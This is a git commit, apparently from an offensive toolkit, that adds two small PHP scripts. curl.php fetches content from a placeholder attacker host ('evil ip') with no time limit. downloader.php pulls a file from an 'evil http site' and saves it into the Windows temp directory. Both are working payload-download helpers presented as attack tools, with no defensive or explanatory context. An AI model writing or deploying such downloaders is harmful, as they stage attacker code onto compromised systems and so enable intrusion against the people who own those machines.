01ed7daf2cd89a530a9fb4b47919855dc4d0e447
RatSteak <ratsteak@protonmail.com>
2020-04-27 10:46:35 +0200

    PHP tools

---
+++ php/curl.php
@@ -0,0 +1,11 @@
+<?php 
+// simple CURL PHP
+
+// infinite execution
+set_time_limit(0);
+$x = curl_init();
+curl_setopt($x, CURLOPT_URL, "evil ip");
+curl_setopt($x, CURLOPT_RETURNTRANSFER, true);
+$r = curl_exec($x);
+curl_close($x);
+echo $r;
---
+++ php/downloader.php
@@ -0,0 +1,17 @@
+<?php
+// file downloader PHP without CURL
+
+$path = "C:\\windows\\temp\\";
+$u = "evil http site";
+$nfn = $path . basename($u);
+$f = fopen ($u, "rb");
+if ($f) {
+	$nf = fopen ($nfn, "wb");
+	if ($nf){
+		while(!feof($f)) {
+			fwrite($nf, fread($f, 1024 * 8 ), 1024 * 8 );
+		}
+		fclose($nf); 
+	}
+	fclose($f);
+}
